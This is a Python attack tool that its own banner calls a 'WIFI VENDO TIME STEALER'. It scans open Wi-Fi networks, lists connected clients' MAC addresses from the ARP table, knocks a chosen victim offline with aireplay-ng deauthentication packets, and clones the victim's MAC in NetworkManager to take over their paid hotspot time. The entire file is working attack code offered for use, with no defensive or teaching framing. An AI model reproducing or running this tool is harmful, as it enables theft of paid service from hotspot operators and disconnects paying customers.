# coded by 0xbit

import wifi
import subprocess, os, random, time, sys
from pystyle import *
from tabulate import tabulate
import threading
import multiprocessing
from alive_progress import alive_bar
from wifi.exceptions import InterfaceError
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

my_dark_gray = Col.dark_gray
my_light_gray = Col.light_gray
my_purple = Colors.StaticMIX((Col.purple, Col.blue))
my_brpurple = Colors.StaticMIX((Col.purple, Col.blue, Col.blue))

def print_custom_stage(text, symbol='?', col1=my_light_gray, col2=None):
    if col2 is None:
        col2 = my_light_gray if symbol == '?' else my_purple
    return f" {Col.Symbol(symbol, col1, my_dark_gray)} {col2}{text}{Col.reset}"

w_interface = 'wlan0'

mac = [random.randint(0x00, 0xff) for _ in range(6)]
mac_string = ':'.join(f'{byte:02X}' for byte in mac)

def mac_changer(c_mac):
    file_path = '/etc/NetworkManager/NetworkManager.conf'
    new_line = f'wifi.cloned-mac-address={c_mac}'

    with open(file_path, 'r') as file:
        lines = file.readlines()

    start_index = -1
    end_index = -1
    for i, line in enumerate(lines):
        if line.strip() == "[connection]":
            start_index = i + 1
            break

    if start_index != -1:
        for i in range(start_index, len(lines)):
            if lines[i].startswith("["):
                end_index = i
                break
        if end_index == -1:
            end_index = len(lines)

        for i in range(start_index, end_index):
            if lines[i].strip().startswith("wifi.cloned-mac-address="):
                lines[i] = new_line + "\n"
                break
        else:
            lines.insert(end_index, new_line + "\n")
    else:
        lines.append("\n[connection]\n" + new_line + "\n")

    with open(file_path, 'w') as file:
        file.writelines(lines)

    os.system('sudo systemctl restart NetworkManager')

def disconnect_from_wifi():
    try:
        with open('/dev/null', 'w') as null_file:
            subprocess.run(["nmcli", "device", "disconnect", f'{w_interface}'], stdout=null_file, stderr=null_file, check=True)
    except subprocess.CalledProcessError:
        pass 

def connect_to_wifi(ssid):
    try:
        os.system('sudo nmcli dev set wlan0 managed yes')
        time.sleep(4)
        with open('/dev/null', 'w') as null_file:
            subprocess.run(["nmcli", "device", "wifi", "connect", ssid], stdout=null_file, stderr=null_file, check=True)
    except subprocess.CalledProcessError:
        pass

def generate_random_mac():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    mac_address = ':'.join(f'{byte:02X}' for byte in mac)
    return mac_address

def loading_animation():
    for _ in range(10):
        global mac_address
        mac_address = generate_random_mac()
        banner(mac_address)
        sys.stdout.flush()
        time.sleep(0.1) 

def loading():
    try:
        with alive_bar(900, title='   SCANNING CLIENTS') as bar:
            for i in range(900):
                time.sleep(0.03)
                bar()
    except KeyboardInterrupt:
        os.system('clear')
        sys.exit('BYE BYE!')

def ap_loading():
    try:
        with alive_bar(300, title='   SCANNING WIFI VENDO') as bar:
            for i in range(300):
                time.sleep(0.03)
                bar()
    except KeyboardInterrupt:
        os.system('clear')
        sys.exit('BYE BYE!')

def deauth_client(ap_mac, c_mac, w_interface):
    with open('.ch.txt', 'r') as f:
        channel: str = f.readline()
    with open('.ssid.txt', 'r') as f:
        ssid: str = f.readline()
    subprocess.run(['airmon-ng', 'start', w_interface, channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(tabulate([[f'STARTING CONFIGURING NETWORK MAC_ADDRS : {c_mac}']], tablefmt='fancy_grid'))
    command = f'sudo aireplay-ng -a {ap_mac} -c {c_mac} -0 3 {w_interface}mon > /dev/null 2>&1'
    os.system(command)
    subprocess.run(['airmon-ng', 'stop', w_interface + 'mon'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    mac_changer(c_mac)
    time.sleep(2)
    connect_to_wifi(ssid)
    time.sleep(4)
    print(tabulate([['CONNECTED TO: ', ssid], ['CHECK YOUR VENDO TIME:', '10.0.0.1']], tablefmt='fancy_grid'))

def get_connected_ap_mac(interface):
    try:
        command = f"iwconfig {interface}"
        result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode("utf-8")
        lines = result.split('\n')
        for line in lines:
            if "Access Point" in line:
                ap_mac = line.split("Access Point: ")[1]
                return ap_mac
        return None
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None

def scan_open_wifi():
    try:
        os.system('sudo nmcli dev set wlan0 managed no')
        wifi_list = wifi.Cell.all(w_interface)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
        open_networks = [cell for cell in wifi_list if not cell.encrypted]
        return open_networks
    except InterfaceError:
        print("try again")
        return []
    
def print_wifi_list(networks):
    os.system('clear')
    banner(mac_address)
    print(tabulate([['Available Open Wi-Fi Networks      | TYPE 0 to RESCAN']], tablefmt='fancy_grid'))
    print('')
    for idx, network in enumerate(networks, start=1):
        with open('.ch.txt', 'w') as f:
            f.write(str(network.channel))
            f.close()
        print(f"{idx}: {network.ssid} ")

def main():
    os.system('clear')
    banner(mac_address)
    p2 = multiprocessing.Process(target=ap_loading)
    p2.start()
    p2.join()
    open_networks = scan_open_wifi()

    if not open_networks:
        print("No open Wi-Fi networks found.")
        return scan_open_wifi()

    print_wifi_list(open_networks)

    try:
        print()
        selected_number = int(input(print_custom_stage(f"DEDSEC {my_dark_gray}-> {Col.reset}", "?", col2 = my_brpurple)).replace('"','').replace("'",""))
        if selected_number == 0:
            return main()
        elif 1 <= selected_number <= len(open_networks):
            target_wifi: str = (f"{open_networks[selected_number - 1].ssid}")
            with open('.ssid.txt', 'w') as f:
                f.write(target_wifi)
                f.close()
            connect_to_wifi(target_wifi)
            global ap_mac
            ap_mac = get_connected_ap_mac(w_interface)
        else:
            print("Invalid selection. Please choose a valid number.")
    except ValueError:
        print("Invalid input. Please enter a number.")

def read_mac_addresses(filename):
    mac_addresses = []
    with open(filename, 'r') as file:
        lines = file.readlines()
        for line in lines:
            parts = line.split()
            if len(parts) >= 3 and parts[1] == 'ether':
                mac = parts[2]
                if 'localhost' not in line and '10.0.0.1' not in line:
                    mac_addresses.append(mac)
    return mac_addresses

def print_mac_addresses(mac_list):
    print(tabulate([['Available MAC Addresses         | TYPE 0 to RESCAN']], tablefmt='fancy_grid'))
    print('')
    for idx, mac in enumerate(mac_list, start=1):
        print(f"{idx}: {mac}")

def get_mac_address(interface):
    try:
        mac = open(f"/sys/class/net/{interface}/address").read()
        return mac.strip()
    except FileNotFoundError:
        return "MAC address not found"

def get_mac():
    mac_address = get_mac_address(w_interface)
    return mac_address

def scan_client():
    p2 = multiprocessing.Process(target=loading)
    p1 = multiprocessing.Process(target=loading_animation)
    p1.start()
    p2.start()
    p1.join()
    p2.join()

    filename = '.mac.txt'
    os.system(f'arp -e > {filename}')
    mac_addresses = read_mac_addresses(filename)
    machine_mac = get_mac()

    if not mac_addresses:
        print("No valid MAC addresses found in the file.")
        scan_client()

    try:
        mac_addresses.remove(machine_mac)
    except ValueError:
        pass

    print_mac_addresses(mac_addresses)

    while True:
        try:
            print()
            selected_number = int(input(print_custom_stage(f"DEDSEC {my_dark_gray}-> {Col.reset}", "?", col2 = my_brpurple)).replace('"','').replace("'",""))
            if selected_number == 0:
                scan_client()
            elif 1 <= selected_number <= len(mac_addresses):
                smac = mac_addresses[selected_number - 1]
                disconnect_from_wifi()
                deauth_client(ap_mac, smac, w_interface)
                break
            else:
                print("Invalid selection.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def run_script():
    subprocess.run(["python3", "spoof.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def banner(mac_address):
    os.system('clear')
    my_banner = f'''

                            .,,uod8B8bou,,.
                  ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
             ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
             !...:!TVBBBRPFT||||||||||!!^^""'   ||||
             !.......:!?|||||!!^^""'            ||||    WIFI VENDO TIME STEALER BY 0XBIT
             !.........||||                     ||||    GITHUB: 0XBITX
             !.........||||  ##                 ||||
             !.........||||                     ||||    Mastering the Art of Time Theft
             !.........||||                     ||||    Make every second yours
             !.........||||                     ||||    
             !.........||||                     ||||    {mac_address}
             `.........||||                    ,||||    {mac_address}
              .;.......||||               _.-!!|||||
       .,uodWBBBBb.....||||       _.-!!|||||||||!:'
    !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
    !..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
    !....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
    !......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
    !........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
    `..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
      `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
        `........::::::::::::::::;iof688#888888888888888888b.     `
          `......:::::::::;iof688888888888888888888888888888b.
            `....:::;iof688888888888888888888888888888888899fT!
              `..::!8888888888888888888888888888888899fT|!^"'
                `' !!988888888888888888888888899fT|!^"'
                    `!!8888888888888888899fT|!^"'
                      `!988888888899fT|!^"'
                        `!9899fT|!^"'
                          `!^"'
                           
                               
                               '''

    print(Colorate.Diagonal(Colors.DynamicMIX((my_purple, my_dark_gray)), my_banner))

def menu():
    try:
        mac_changer(mac_string)
        loading_animation()
        print(((my_purple)), ('\t\t\t[?] PRESS ENTER TO START [?]\r'))
        input()
        disconnect_from_wifi()
        main()
        main_thread = threading.Thread(target=run_script)
        main_thread.daemon = True
        main_thread.start()
        scan_client()
    except KeyboardInterrupt:
        os.system('sudo nmcli dev set wlan0 managed yes')
        os.system('clear')
        sys.exit('BYE BYE!')

menu()
